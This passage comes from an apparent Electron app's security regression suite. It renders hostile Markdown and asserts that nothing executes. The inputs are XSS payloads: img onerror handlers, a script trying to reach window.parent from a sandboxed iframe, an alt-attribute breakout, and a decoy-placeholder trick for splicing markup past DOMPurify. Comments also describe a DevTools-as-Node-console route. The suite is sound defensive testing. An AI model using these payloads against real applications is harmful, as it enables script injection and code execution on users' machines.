          requireType: typeof window.require,
          moduleType: typeof window.module,
          processType: typeof window.process,
          navigatorPlatform: navigator.platform,
          apiType: typeof api,
          bom: api && api.removeBOM("\\uFEFFloader"),
          mmd: api && api.wrapMermaidContent("graph TD", "diagram.mmd"),
          markdown: api && api.wrapMermaidContent("# Heading", "document.md"),
          fenced: api && api.wrapMermaidContent(fence + "mermaid\\ngraph TD\\n" + fence, "diagram.mmd"),
          constants: api && {
            msPerUnit: api.MS_PER_UNIT,
            fencedLineDiscount: api.FENCED_LINE_DISCOUNT,
            largeDocBudgetMs: api.LARGE_DOC_BUDGET_MS,
          },
          estimated,
          large,
          cases,
          utf8Counts: typeof api?.utf8ByteLength === "function"
            ? ${JSON.stringify(utf8Cases)}.map(api.utf8ByteLength)
            : null,
          utf8Rejected: typeof api?.utf8ByteLength === "function"
            ? [null, undefined, 0, [], {}].map(value => {
              try { api.utf8ByteLength(value); return false; }
              catch (error) { return error instanceof TypeError; }
            })
            : null,
        };
      })()`,
      true,
    );
    const browserPath = probe.navigatorPlatform.startsWith("Win") ? path.win32 : path.posix;
    const expectedBrowserCases = extensionCases.map((filePath) => {
      const extension = browserPath.extname(filePath).toLowerCase();
      return {
        filePath,
        mermaid: [".mmd", ".mermaid"].includes(extension),
        markdown: [".md", ".markdown", ".mdown", ".mkd", ".mkdn", ".mmd", ".mermaid"].includes(extension),
      };
    });
    check(
      "SEC-08 classic file-helpers-core script runs without Node globals",
      probe.requireType === "undefined" &&
        probe.moduleType === "undefined" &&
        probe.processType === "undefined",
      JSON.stringify(probe),
    );
    check(
      "SEC-08 file-helpers loader document reaches its terminal DOM marker",
      probe.terminal === "parsed",
      JSON.stringify(probe),
    );
    check(
      "SEC-08 classic file-helpers-core script preserves BOM, Mermaid, and estimator behavior",
      probe.apiType === "object" &&
        probe.bom === "loader" &&
        probe.mmd === "```mermaid\ngraph TD\n```" &&
        probe.markdown === "# Heading" &&
        probe.fenced === "```mermaid\ngraph TD\n```" &&
        probe.constants &&
        probe.constants.msPerUnit === 0.047 &&
        probe.constants.fencedLineDiscount === 0.8 &&
        probe.constants.largeDocBudgetMs === 10000 &&
        JSON.stringify(probe.estimated) ===
          JSON.stringify({ units: 6.6, lines: 6, fencedLines: 3, pipes: 3 }) &&
        JSON.stringify(probe.large) ===
          JSON.stringify({ large: true, estimatedMs: 0.3102, units: 6.6 }),
      JSON.stringify(probe),
    );
    check(
      `SEC-08 classic file-helpers-core script follows its browser platform extension rules (${extensionCaseLabel})`,
      JSON.stringify(probe.cases) === JSON.stringify(expectedBrowserCases),
      JSON.stringify({ probe, expectedBrowserCases }),
    );
    const expectedByteCounts = utf8Cases.map(value => Buffer.byteLength(value, "utf8"));
    check(
      "SEC-08 Node-free and CommonJS UTF-8 counts match native Unicode bytes and reject non-strings",
      JSON.stringify(probe.utf8Counts) === JSON.stringify(expectedByteCounts) &&
        JSON.stringify(commonJsByteCounts) === JSON.stringify(expectedByteCounts) &&
        commonJsRejected.every(Boolean) &&
        probe.utf8Rejected?.length === commonJsRejected.length &&
        probe.utf8Rejected.every(Boolean),
      JSON.stringify({ probe, commonJsByteCounts, expectedByteCounts, commonJsRejected }),
    );

    const alive = await proveSentinelAlive(loaderWin, sentinel);
    check(
      "SEC-08 file-helpers loader error sentinel was demonstrably watching both channels",
      alive.console === true && alive.dom === true,
      JSON.stringify(alive),
    );
  } finally {
    const sentinelReport = await sentinel.stop();
    check(
      "SEC-08 file-helpers loader fixture emits no unexpected errors",
      sentinelReport.hits.length === 0 && sentinelReport.stalls.length === 0,
      JSON.stringify(sentinelReport),
    );
    if (!loaderWin.isDestroyed()) loaderWin.destroy();
  }
  }

  if (!includeMissingGlobal) return;

  const missingGlobalWin = new BrowserWindow({
    show: false,
    webPreferences: {
      nodeIntegration: true,
      contextIsolation: false,
    },
  });
  const missingGlobalSentinel = startErrorSentinel(missingGlobalWin, {
    label: "sec08-file-helpers-missing-global",
  });
  try {
    await missingGlobalWin.loadFile(path.join(__dirname, "fixtures", "file-helpers-loader.html"));
    await missingGlobalSentinel.mute("missing FoliaFileHelpers must fail loudly");
    let missingGlobalSetup;
    let missingGlobalMute;
    try {
      missingGlobalSetup = await missingGlobalWin.webContents.executeJavaScript(
        `new Promise((resolve) => {
          const savedCore = window.FoliaFileHelpers;
          const savedMenu = window.FoliaContextMenu;
          const savedEvents = window.FoliaDocumentEvents;
          // Reach the target guard rather than failing an earlier prerequisite.
          const prerequisiteEvents = Object.freeze({});
          window.FoliaDocumentEvents = prerequisiteEvents;
          window.FoliaContextMenu = {
            positionContextMenu() {},
            hideContextMenu() {},
          };
          delete window.FoliaFileHelpers;
          const script = document.createElement("script");
          script.src = "../../src/custom-tabs.js?sec08-missing-file-helpers=" + Date.now();
          const finish = (event) => {
            const coreWasAbsent = window.FoliaFileHelpers === undefined;
            const precedingCorePresent = window.FoliaDocumentEvents === prerequisiteEvents;
            window.FoliaFileHelpers = savedCore;
            if (savedMenu === undefined) delete window.FoliaContextMenu;
            else window.FoliaContextMenu = savedMenu;
            if (savedEvents === undefined) delete window.FoliaDocumentEvents;
            else window.FoliaDocumentEvents = savedEvents;
            script.remove();
            resolve({
              event,
              coreWasAbsent,
              coreRestored: window.FoliaFileHelpers === savedCore,
              precedingCorePresent,
              precedingCoreRestored: window.FoliaDocumentEvents === savedEvents,
            });
          };
          script.addEventListener("load", () => finish("load"), { once: true });
          script.addEventListener("error", () => finish("error"), { once: true });
          document.head.appendChild(script);
        })`,
        true,
      );
      await missingGlobalSentinel.drain();
      missingGlobalMute = missingGlobalSentinel.currentMute();
    } finally {
      await missingGlobalSentinel.unmute();
    }
    const missingGlobalSuppressed = (missingGlobalMute && missingGlobalMute.suppressed) || [];
    const missingCoreErrors = missingGlobalSuppressed.filter(
      (entry) =>
        entry.kind === "console-error" &&
        entry.detail.includes("FoliaFileHelpers must load before custom-tabs.js"),
    );
    check(
      "SEC-08 file-helpers missing-global probe removes and restores the browser core around a fresh custom-tabs load",
      missingGlobalSetup &&
        missingGlobalSetup.event === "load" &&
        missingGlobalSetup.coreWasAbsent === true &&
        missingGlobalSetup.coreRestored === true &&
        missingGlobalSetup.precedingCorePresent === true &&
        missingGlobalSetup.precedingCoreRestored === true,
      JSON.stringify(missingGlobalSetup),
    );
    check(
      "SEC-08 custom-tabs fails loudly when its browser file-helpers core is absent",
      missingCoreErrors.length > 0,
      JSON.stringify(missingGlobalSuppressed),
    );
    check(
      "SEC-08 custom-tabs missing-global probe suppresses only the expected core error",
      missingCoreErrors.length > 0 &&
        missingCoreErrors.length === missingGlobalSuppressed.length,
      JSON.stringify(missingGlobalSuppressed),
    );
    const missingGlobalAlive = await proveSentinelAlive(missingGlobalWin, missingGlobalSentinel);
    check(
      "SEC-08 file-helpers missing-global sentinel was demonstrably watching both channels",
      missingGlobalAlive.console === true && missingGlobalAlive.dom === true,
      JSON.stringify(missingGlobalAlive),
    );
  } finally {
    const missingGlobalReport = await missingGlobalSentinel.stop();
    check(
      "SEC-08 file-helpers missing-global probe emits no unexpected errors",
      missingGlobalReport.hits.length === 0 && missingGlobalReport.stalls.length === 0,
      JSON.stringify(missingGlobalReport),
    );
    if (!missingGlobalWin.isDestroyed()) missingGlobalWin.destroy();
  }
}

async function runFileHelpersFocusedProbe() {
  const keepAliveWin = new BrowserWindow({
    show: false,
    webPreferences: {
      nodeIntegration: false,
      contextIsolation: true,
    },
  });
  try {
    await runFileHelpersLoaderProbe();
  } finally {
    if (!keepAliveWin.isDestroyed()) keepAliveWin.destroy();
  }
}

async function runFocusedLoaderProbes() {
  // Without main.js, Electron exits as soon as a probe destroys its only
  // BrowserWindow. Keep this no-Node window alive until both independent
  // loader fixtures have completed.
  const keepAliveWin = new BrowserWindow({
    show: false,
    webPreferences: {
      nodeIntegration: false,
      contextIsolation: true,
    },
  });
  try {
    await runUtilsLoaderProbe();
    await runMermaidConfigLoaderProbe();
    await runContextMenuLoaderProbe();
    await runEmojiLoaderProbe();
  } finally {
    if (!keepAliveWin.isDestroyed()) keepAliveWin.destroy();
  }
}

async function run(win) {
  // A MAIN-PROCESS property, asserted before any page state matters.
  //
  // Electron installs a default application menu - File/Edit/View/Window -
  // whenever nothing calls Menu.setApplicationMenu, and its View submenu
  // carries Toggle Developer Tools on Ctrl+Shift+I. The renderer here runs with
  // nodeIntegration: true, so that stock keystroke is a Node console with the
  // user's full filesystem rights in a shipped build: the "open this file,
  // press the shortcut, paste this" route, which needs no bug in Folia at all.
  //
  // MEASURED, with a positive control, because a bare "it did not open" would
  // have failed open: two identical windows were sent a synthesised
  // Ctrl+Shift+I, and the one WITHOUT setMenu(null) opened DevTools while the
  // one with it did not. So the per-window call is a security control and not
  // the UI tidying its old comment claimed.
  //
  // main.js now does both halves - setMenu(null) per window, and a global
  // suppression at whenReady so a window added later that forgets the call
  // cannot inherit the accelerator. This asserts the global half in the LIVE
  // app rather than by grepping for the call, which would keep passing if the
  // call were moved behind a condition that never runs.
  {
    const { Menu } = require("electron");
    const menu = Menu.getApplicationMenu();
    check(
      "no default application menu survives startup, so no stock keystroke reaches DevTools",
      menu === null,
      menu === null
        ? ""
        : `application menu present with top-level ${JSON.stringify(
            menu.items.map((i) => i.label || i.role),
          )} - its View submenu binds Toggle Developer Tools to Ctrl+Shift+I, ` +
          "which is a Node console while nodeIntegration is on",
    );
  }

  const exec = (code) => win.webContents.executeJavaScript(code, true);

  const testPreloadBridge = await exec(
    `typeof globalThis.__foliaTestPdfRestore`,
  );
  check(
    "an unmarked security launch has no test-only PDF restore bridge",
    testPreloadBridge === "undefined",
    `typeof globalThis.__foliaTestPdfRestore=${testPreloadBridge}`,
  );

  // This suite's whole job is to fire hostile input at the app, so a large
  // share of the console noise it produces is the app defending itself. Those
  // patterns are ignored by name; anything else that reaches the console, or
  // any error that becomes visible on screen, is a real defect and fails the
  // run. See startErrorSentinel() in test-visual-utils.js.
  const sentinel = startErrorSentinel(win, {
    label: "security",
    ignore: [
      // Every CSP refusal below is a control working as designed. They are
      // asserted individually elsewhere in this file, so ignoring the console
      // copy costs no coverage.
      /Refused to (load|connect|run|execute|apply)/i,
      /Content Security Policy/i,
      /probe\.invalid/i,
      /ERR_BLOCKED_BY_CSP/,
      // Unresolvable probe hosts. `.invalid` is guaranteed never to resolve
      // (RFC 6761), which is the point - see the popup suite's note.
      /net::ERR_NAME_NOT_RESOLVED/,
      /Failed to load resource/i,
    ],
    // Almost every <img> in this suite points at a path chosen to be absent
    // (x.png, local.png, //attacker.invalid/...): the assertions are about
    // whether the src survived sanitization, never about whether it loaded.
    // The broken-image check stays active in the suites where a broken image
    // would be a real defect.
    ignoreKinds: ["broken-image"],
  });

  // This suite fires hostile documents at the app and clicks the results, so
  // it is the most likely of all of them to reach shell.openExternal. Trapped
  // before the first render. See trapExternalOpens() in test-visual-utils.js.
  // The <area> section below installs its own recorder on top of this one and
  // restores it afterwards, which puts the trap back rather than the real
  // opener.
  await trapExternalOpens(win);

  // Render `md` through the chosen pipeline and report whether any payload
  // managed to run. `settle` covers mermaid/iframe work that lands after the
  // render promise resolves.
  async function render(md, mode, settle = 900) {
    await exec(`
      (async () => {
        window.__pwned = null;
        window.__lastRenderError = null;
        try {
          await window.renderMarkdown(${JSON.stringify(md)}, ${JSON.stringify(mode)});
        } catch (e) {
          window.__lastRenderError = String(e && e.message || e);
        }
        return null;
      })()
    `);
    await sleep(settle);
    return exec(`window.__pwned`);
  }

  const viewerHtml = () => exec(`document.getElementById('viewer').innerHTML`);

  // ==========================================================================
  // SEC-02 - mermaid fence body injected raw after DOMPurify
  // ==========================================================================

  // Everything from here to the valid-diagram assertion below feeds mermaid
  // markup it cannot parse - that is the payload. Mermaid answers with its red
  // "Syntax error in text" graphic, which is the correct outcome and exactly
  // what the SEC-02 assertions are checking for (an SVG that is *not* a real
  // diagram). Muted narrowly so the same graphic appearing anywhere else in
  // this suite still fails the run.
  await sentinel.mute("SEC-02 feeds mermaid an unparseable payload on purpose");

  const mermaidPayload =
    "# Doc\n\n```mermaid\n<img src=x onerror=\"window.__pwned='mermaid-full'\">\n```\n";

  check(
    "SEC-02 mermaid fence payload does not execute (full render)",
    (await render(mermaidPayload, "full")) === null,
    "window.__pwned was set from a mermaid fence body",
  );

  check(
    "SEC-02 mermaid fence payload does not execute (light-format render)",
    (await render(
      "# Doc\n\n```mermaid\n<img src=x onerror=\"window.__pwned='mermaid-light'\">\n```\n",
      "light-format",
    )) === null,
    "window.__pwned was set via the light-format path",
  );

  // The body must survive as *text*, not as markup.
  const mermaidEscaped = await exec(`
    (() => {
      const el = document.querySelector('pre.mermaid');
      if (!el) return { found: false };
      return { found: true, imgChildren: el.querySelectorAll('img').length };
    })()
  `);
  check(
    "SEC-02 mermaid body is inserted as text, not as an element",
    mermaidEscaped.found === false || mermaidEscaped.imgChildren === 0,
    JSON.stringify(mermaidEscaped),
  );

  // ==========================================================================
  // SEC-03 - Markdown image alt text must not escape its attribute.
  // ==========================================================================
  const altBreakoutPayload =
    "# Doc\n\n" +
    "![\" onerror=\"window.__pwned='alt'](a.png)\n\n" +
    "![second](b.png)\n";

  check(
    "SEC-03 an image alt cannot break out of its attribute via markdown",
    (await render(altBreakoutPayload, "full")) === null,
    "window.__pwned was set from an image alt attribute",
  );

  // ==========================================================================
  // SEC-04 - Unknown-language code fences must escape HTML.
  // ==========================================================================
  const unknownFencePayload =
    "# Doc\n\n```unknown-test-language\n<img src=x onerror=window.__pwned='fence'>\n```\n";

  check(
    "SEC-04 unknown-language code does not execute HTML",
    (await render(unknownFencePayload, "full")) === null,
    "window.__pwned was set from a code fence",
  );

  // ==========================================================================
  // SEC-01 - @@@html blocks reach window.parent
  // ==========================================================================
  const rawHtmlPayload =
    "# Doc\n\n@@@html\n" +
    "<p id=rawhtml-marker>raw html body</p>\n" +
    "<scr" + "ipt>try{window.parent.__pwned='iframe'}catch(e){}</scr" + "ipt>\n" +
    "@@@\n";

  check(
    "SEC-01 @@@html iframe cannot reach window.parent (full render)",
    (await render(rawHtmlPayload, "full", 2200)) === null,
    "an @@@html block wrote to window.parent - the iframe is same-origin",
  );

  check(
    "SEC-01 @@@html iframe cannot reach window.parent (light-format render)",
    (await render(rawHtmlPayload, "light-format", 2200)) === null,
    "light-format path allowed parent access",
  );

  // The sandbox attribute must be present AND must not re-grant same-origin,
  // because sandbox="allow-scripts allow-same-origin" is equivalent to no
  // sandbox at all for this purpose.
  //
  // hasPayload is asserted here on purpose: if the pipeline ever drops srcdoc
  // entirely (DOMPurify does exactly that when the value contains a <script>),
  // the two attack tests above would pass for the wrong reason - nothing ran
  // because nothing loaded. This makes that failure mode loud instead of silent.
  const iframeAttrs = await exec(`
    (() => {
      const f = document.querySelector('iframe.raw-html-block');
      if (!f) return { found: false };
      const sd = f.getAttribute('srcdoc') || '';
      return {
        found: true,
        sandbox: f.getAttribute('sandbox'),
        hasSrcdoc: !!sd,
        hasPayload: sd.includes('window.parent.__pwned')
      };
    })()
  `);
  check(
    "SEC-01 @@@html iframe carries a real sandbox without allow-same-origin",
    iframeAttrs.found === true &&
      typeof iframeAttrs.sandbox === "string" &&
      iframeAttrs.sandbox.includes("allow-scripts") &&
      !iframeAttrs.sandbox.includes("allow-same-origin"),
    JSON.stringify(iframeAttrs),
  );

  check(
    "SEC-01 the attack actually loaded, so the two tests above are not vacuous",
    iframeAttrs.hasSrcdoc === true && iframeAttrs.hasPayload === true,
    JSON.stringify(iframeAttrs),
  );

  // ==========================================================================
  // @@@html FENCE TOLERANCE - a fence that fails to match is a silent failure
  // ==========================================================================
  // Measured on the original expression: a single TRAILING SPACE after the
  // opening fence made it not match. Nothing in an editor shows that space and
  // nothing reports the miss - the raw HTML simply went down the ordinary
  // marked + DOMPurify path instead of into its sandboxed frame, arriving with
  // its scripts stripped and its layout mangled.
  //
  // Both render paths are checked for every variant, because they parse the
  // fence separately and silently diverging is a recurring defect class in this
  // file. They now share one RAW_HTML_FENCE, which is what makes that cheap.
  const fenceProbe = async (md, mode) => {
    await render(md, mode, 1200);
    return exec(`
      (() => {
        const frames = document.querySelectorAll('iframe.raw-html-block');
        const f = frames[0];
        const sd = f ? (f.getAttribute('srcdoc') || '') : '';
        return {
          frames: frames.length,
          carriesPayload: sd.includes('FENCE-BODY'),
          // If the fence did not match, the block's text is left in the
          // document. That is the observable symptom the user actually reports.
          leakedAsProse: (document.getElementById('viewer').textContent || '').includes('@@@'),
        };
      })()
    `);
  };
  const fenceCases = [
    ["a trailing space after the opening fence", "# D\n\n@@@html \n<p>FENCE-BODY</p>\n@@@\n"],
    ["a trailing tab after the opening fence", "# D\n\n@@@html\t\n<p>FENCE-BODY</p>\n@@@\n"],
    ["an indented closing fence", "# D\n\n@@@html\n<p>FENCE-BODY</p>\n   @@@\n"],
    // Accepted and IGNORED: upstream carries a per-block zoom here, which is a
    // feature this fork has not taken. Refusing the syntax outright would dump
    // the raw HTML into the page as prose, which is the worse failure.
    ["an upstream parameter list", "# D\n\n@@@html(zoom:50%)\n<p>FENCE-BODY</p>\n@@@\n"],
    ["the plain fence", "# D\n\n@@@html\n<p>FENCE-BODY</p>\n@@@\n"],
  ];
  for (const [label, md] of fenceCases) {
    for (const mode of ["full", "light-format"]) {
      const r = await fenceProbe(md, mode);
      check(
        `FENCE ${label} still produces a sandboxed @@@html frame (${mode})`,
        r.frames === 1 && r.carriesPayload === true && r.leakedAsProse === false,
        JSON.stringify(r),
      );
    }
  }
  // The tolerance must not become "anything starting with @@@html". A word
  // glued to the fence is not a fence, and treating it as one would hand the
  // sandbox-bypassing raw path to text the author never marked as a block.
  const notAFence = await fenceProbe("# D\n\n@@@htmlish\n<p>FENCE-BODY</p>\n@@@\n", "full");
  check(
    "FENCE a word glued to the opening fence is NOT treated as an @@@html block",
    notAFence.frames === 0,
    JSON.stringify(notAFence),
  );

  // ==========================================================================
  // Feature preservation - the remedy must not break what it protects
  // ==========================================================================

  // Mermaid still renders to SVG. Asserting only that *an* svg exists is too
  // weak: mermaid emits an svg for parse failures too, so a broken escape would
  // still "pass". Assert it is a real flowchart carrying the node labels.
  await render(
    "# Doc\n\n```mermaid\ngraph TD\n  A[Start] --> B[End]\n```\n",
    "full",
    2500,
  );
  const mermaidSvg = await exec(`
    (() => {
      const el = document.querySelector('pre.mermaid');
      const svg = el && el.querySelector('svg');
      if (!svg) return { present: !!el, hasSvg: false };
      const labels = Array.from(svg.querySelectorAll('text,tspan,foreignObject'))
        .map(t => (t.textContent || '').trim());
      return {
        present: true,
        hasSvg: true,
        role: svg.getAttribute('aria-roledescription'),
        nodeCount: svg.querySelectorAll('g.node').length,
        hasLabels: labels.includes('Start') && labels.includes('End'),
        isError: /syntax error|mermaid version/i.test(svg.textContent || ''),
        src: el.getAttribute('data-mermaid-src')
      };
    })()
  `);
  check(
    "FEATURE mermaid diagram still renders to SVG",
    mermaidSvg.present && mermaidSvg.hasSvg,
    JSON.stringify(mermaidSvg),
  );
  check(
    "FEATURE mermaid SVG is a real diagram with its labels, not an error graphic",
    mermaidSvg.hasSvg === true &&
      mermaidSvg.isError === false &&
      mermaidSvg.nodeCount === 2 &&
      mermaidSvg.hasLabels === true,
    JSON.stringify(mermaidSvg),
  );
  // A real diagram is on screen now, so the unparseable payloads are gone and
  // the sentinel can go back on watch.
  await sentinel.unmute();

  // Mermaid syntax containing '<' must round-trip. Class diagrams use '<|--',
  // which an over-eager escape would corrupt into something mermaid rejects.
  await render(
    "# Doc\n\n```mermaid\nclassDiagram\n  Animal <|-- Duck\n```\n",
    "full",
    2500,
  );
  const mermaidAngle = await exec(`
    (() => {
      const el = document.querySelector('pre.mermaid');
      if (!el) return { present: false };
      return {
        present: true,
        src: el.dataset.mermaidSrc || '',
        hasSvg: !!el.querySelector('svg')
      };
    })()
  `);
  check(
    "FEATURE mermaid source containing '<|--' survives intact",
    mermaidAngle.present &&
      mermaidAngle.src.includes("<|--") &&
      mermaidAngle.hasSvg,
    JSON.stringify(mermaidAngle),
  );

  for (const mode of ["full", "light-format"]) {
    await render(
      "# Doc\n\n<!-- images-start -->\n![one](a.png)\n![two](b.png)\n<!-- images-end -->\n",
      mode,
    );
    const images = await exec(`
      (() => {
        const viewer = document.getElementById('viewer');
        const imgs = [...viewer.querySelectorAll('img')];
        return {
          imgCount: imgs.length,
          srcs: imgs.map(i => i.getAttribute('src')),
          alts: imgs.map(i => i.getAttribute('alt')),
          markerText: viewer.textContent.includes('images-start') ||
                      viewer.textContent.includes('images-end')
        };
      })()
    `);
    check(
      `FEATURE HTML comments preserve their neighboring images (${mode})`,
      images.imgCount === 2 &&
        images.srcs.length === 2 &&
        images.srcs[0] === "a.png" && images.srcs[1] === "b.png" &&
        images.alts.join(",") === "one,two" &&
        images.markerText === false,
      JSON.stringify(images),
    );

    await render("# Doc\n\n```unknown-test-language\n<b>literal code</b>\n```\n", mode);
    const code = await exec(`
      (() => {
        const viewer = document.getElementById('viewer');
        const code = viewer.querySelector('pre code');
        return {
          codeBlock: !!code,
          boldInjected: !!viewer.querySelector('pre code b'),
          text: code ? code.textContent : null
        };
      })()
    `);
    check(
      `FEATURE unknown-language fences preserve escaped code (${mode})`,
      code.codeBlock === true &&
        code.boldInjected === false &&
        code.text.includes("<b>literal code</b>"),
      JSON.stringify(code),
    );
  }

  // @@@html still displays its content (sandboxed, but not blank).
  await render(
    "# Doc\n\n@@@html\n<p id=rawhtml-marker>hello from raw html</p>\n@@@\n",
    "full",
    2000,
  );
  const rawHtml = await exec(`
    (() => {
      const f = document.querySelector('iframe.raw-html-block');
      if (!f) return { present: false };
      const sd = f.getAttribute('srcdoc') || '';
      return {
        present: true,
        srcdocHasBody: sd.includes('hello from raw html'),
        sandbox: f.getAttribute('sandbox')
      };
    })()
  `);
  check(
    "FEATURE @@@html block still carries its content into the iframe",
    rawHtml.present && rawHtml.srcdocHasBody,
    JSON.stringify(rawHtml),
  );

  // Ordinary markdown must be completely unaffected.
  await render(
    "# Title\n\n## Sub\n\nSome **bold** and `code` and [a link](https://example.invalid).\n\n" +
      "| a | b |\n|---|---|\n| 1 | 2 |\n\n" +
      "```js\nconst x = 1;\n```\n\n" +
      "![pic](local.png)\n\n" +
      "<span style=\"color:red\" class=\"keepme\">inline html</span>\n",
    "full",
    1200,
  );
  const basics = await exec(`
    (() => {
      const v = document.getElementById('viewer');
      const span = v.querySelector('span.keepme');
      return {
        h1: v.querySelectorAll('h1').length,
        h2: v.querySelectorAll('h2').length,
        strong: v.querySelectorAll('strong').length,
        code: v.querySelectorAll('code').length,
        link: !!v.querySelector('a[href="https://example.invalid"]'),
        table: v.querySelectorAll('table tbody tr').length,
        pre: v.querySelectorAll('pre').length,
        // Authored-or-resolved: whether a document happens to be open (the app
        // restores the last file at boot) decides whether the relative src is
        // resolved to a file:// URL. This assertion is about the image
        // surviving the pipeline, not about resolution - which has its own
        // section below. Deliberately matched on the src rather than on the
        // resolver's bookkeeping attribute, so dropping that attribute breaks
        // only the assertion that is actually about it.
        img: !!v.querySelector('img[src="local.png"], img[src$="/local.png"]'),
        inlineSpan: !!span,
        spanStyle: span ? span.getAttribute('style') : null
      };
    })()
  `);
  check(
    "FEATURE ordinary markdown still renders (headings, table, code, link, img)",
    basics.h1 >= 1 &&
      basics.h2 >= 1 &&
      basics.strong >= 1 &&
      basics.link &&
      basics.table === 1 &&
      basics.pre >= 1 &&
      basics.img,
    JSON.stringify(basics),
  );
  check(
    "FEATURE inline HTML with class and style attributes still survives",
    basics.inlineSpan && !!basics.spanStyle,
    JSON.stringify(basics),
  );

  // Data-URI images must survive sanitization. This used to be implemented by
  // swapping them for a placeholder around DOMPurify; that dance was SEC-28 (a
  // full sanitizer bypass) and has been deleted. DOMPurify permits data: on
  // <img> natively via DATA_URI_TAGS, so this check now guards the real
  // behaviour rather than the workaround.
  const tinyPng =
    "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==";
  await render(`# Doc\n\n![tiny](${tinyPng})\n`, "full", 1000);
  const dataUri = await exec(`
    (() => {
      const img = document.querySelector('#viewer img');
      return {
        src: img ? img.getAttribute('src') : null,
        renderError: window.__lastRenderError,
      };
    })()
  `);
  check(
    "FEATURE data-URI images survive the sanitize step",
    typeof dataUri.src === "string" &&
      dataUri.src.startsWith("data:image/png;base64,") &&
      dataUri.renderError === null,
    JSON.stringify(dataUri),
  );

  // The same, on the light-format path. Both render paths carried the deleted
  // dance, so both need the guard. The alt text differs from the full-path
  // document on purpose: patchViewerDOM keys top-level blocks by a hash of
  // their outerHTML and reuses matched nodes verbatim, so an identical
  // <p><img></p> block would be adopted from the previous render and this
  // assertion would inspect a node the FULL path built. Measured: with the alt
  // text shared, a probe expando set on the full-path node survived into this
  // check. Changing the alt forces light-format to build the node it is
  // being measured on.
  await render(`# Doc\n\n![tiny light](${tinyPng})\n\nedited\n`, "light-format", 900);
  const dataUriLight = await exec(`
    (() => {
      const img = document.querySelector('#viewer img');
      return {
        src: img ? img.getAttribute('src') : null,
        alt: img ? img.getAttribute('alt') : null,
        renderError: window.__lastRenderError,
      };
    })()
  `);
  check(
    "FEATURE data-URI images survive the sanitize step (light-format path)",
    typeof dataUriLight.src === "string" &&
      dataUriLight.src.startsWith("data:image/png;base64,") &&
      dataUriLight.alt === "tiny light" &&
      dataUriLight.renderError === null,
    JSON.stringify(dataUriLight),
  );

  // The deleted dance had one real side effect nobody had noticed: it swapped
  // the data: URI out for a placeholder BEFORE DOMPurify parsed the HTML, so
  // the payload was never judged by DOMPurify's SAFE_FOR_XML filter. That
  // filter (on by default; SANITIZE_CONFIG does not set it) drops any
  // attribute whose value matches /((--!?|])>)|<\/(style|script|title|xmp|
  // textarea|noscript|iframe|noembed|noframes)/i, and it is applied BEFORE
  // forceKeepAttr is consulted, so a hook cannot rescue it.
  //
  // Measured against the vendored DOMPurify 3.4.12, not assumed: raw,
  // entity-encoded and DTD-subset SVG data URIs all lose their src now, where
  // the dance smuggled them through; base64 is unaffected. This is an accepted
  // trade - the payload the dance protected is indistinguishable from the
  // payload it exfiltrated (SEC-28). These checks pin the trade so it stays a
  // recorded fact rather than a future surprise.
  const rawStyleSvg =
    "<img src=\"data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><style>.a{fill:red}</style></svg>\">";
  const entityStyleSvg =
    "<img src=\"data:image/svg+xml,&lt;svg&gt;&lt;/style&gt;&lt;/svg&gt;\">";
  const dtdSvg =
    "<img src=\"data:image/svg+xml,<!DOCTYPE svg PUBLIC '-//W3C//DTD SVG 1.1//EN' [ <!ENTITY a 'b'> ]><svg/>\">";
  const b64StyleSvg =
    "<img src=\"data:image/svg+xml;base64," +
    Buffer.from(
      "<svg xmlns='http://www.w3.org/2000/svg'><style>.a{fill:red}</style></svg>",
      "utf8",
    ).toString("base64") +
    "\">";
  await render(
    `# XmlTrade\n\n${rawStyleSvg}\n\n${entityStyleSvg}\n\n${dtdSvg}\n\n${b64StyleSvg}\n`,
    "full",
    900,
  );
  const xmlTrade = await exec(`
    (() => {
      const imgs = [...document.querySelectorAll('#viewer img')];
      return {
        count: imgs.length,
        withSrc: imgs.filter((i) => i.hasAttribute('src')).length,
        b64Kept: imgs.filter((i) =>
          (i.getAttribute('src') || '').startsWith('data:image/svg+xml;base64,'),
        ).length,
        renderError: window.__lastRenderError,
      };
    })()
  `);
  check(
    "FEATURE base64 data-image survives SAFE_FOR_XML where raw/entity/DTD forms do not",
    xmlTrade.count === 4 &&
      xmlTrade.withSrc === 1 &&
      xmlTrade.b64Kept === 1 &&
      xmlTrade.renderError === null,
    JSON.stringify(xmlTrade),
  );

  // SEC-28. The deleted code restored stored data URIs after sanitization with
  // `html.replace(<fixed literal>, uri)`. A string search value rewrites only
  // the FIRST occurrence, so a document could plant a decoy copy of the
  // placeholder in a code span, consume the restore with it, and have its own
  // unsanitized markup spliced into already-sanitized HTML - yielding an
  // <img onerror> DOMPurify never saw, in a window with Node access.
  //
  // These two checks are the revert-proof: restore either block and the
  // handler reappears in the DOM and __pwned is set.
  //
  // All three oracles are absence checks, so each leg also carries a positive
  // control: renderError must be null and the payload <img> must actually be
  // present carrying its data: src. Without those, a render that threw - or
  // one that silently produced nothing - would satisfy every absence check and
  // report green having tested nothing.
  const sec28Doc =
    "# Doc\n\n" +
    "`https://data-uri-placeholder.local/0`\n\n" +
    "<img src=\"data:image/svg+xml,<img src=x onerror=window.__pwned='sec28'>\">\n";

  const sec28Pwned = await render(sec28Doc, "full", 1000);
  const sec28 = await exec(`
    (() => {
      const v = document.querySelector('#viewer');
      return {
        onerror: v ? v.querySelectorAll('[onerror]').length : -1,
        srcX: v ? v.querySelectorAll('img[src="x"]').length : -1,
        dataImg: v
          ? [...v.querySelectorAll('img')].filter(
              (i) => (i.getAttribute('src') || '').startsWith('data:image/svg+xml'),
            ).length
          : -1,
        renderError: window.__lastRenderError,
      };
    })()
  `);
  check(
    "SEC-28 a decoy placeholder cannot splice markup past the sanitizer (full path)",
    sec28Pwned === null &&
      sec28.onerror === 0 &&
      sec28.srcX === 0 &&
      sec28.dataImg === 1 &&
      sec28.renderError === null,
    JSON.stringify({ sec28Pwned, ...sec28 }),
  );

  // Render something benign through the full path first: light-format only
  // engages once something has been rendered, and routing through a clean
  // document keeps this check independent of whatever the full path just left
  // in the viewer.
  await render("# Clean\n\nplain paragraph\n", "full", 900);
  const sec28LightPwned = await render(sec28Doc, "light-format", 900);
  const sec28Light = await exec(`
    (() => {
      const v = document.querySelector('#viewer');
      return {
        onerror: v ? v.querySelectorAll('[onerror]').length : -1,
        srcX: v ? v.querySelectorAll('img[src="x"]').length : -1,
        dataImg: v
